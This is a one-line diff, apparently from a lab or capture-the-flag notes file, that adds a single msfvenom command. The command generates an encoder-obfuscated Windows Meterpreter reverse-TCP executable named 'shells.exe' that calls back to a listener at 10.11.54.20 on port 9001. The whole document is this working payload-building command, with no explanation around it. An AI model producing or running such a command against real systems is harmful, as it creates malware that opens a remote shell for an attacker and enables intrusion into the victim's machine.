@@ -1,0 +1,1 @@
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.54.20 LPORT=9001 -f exe -o shells.exe
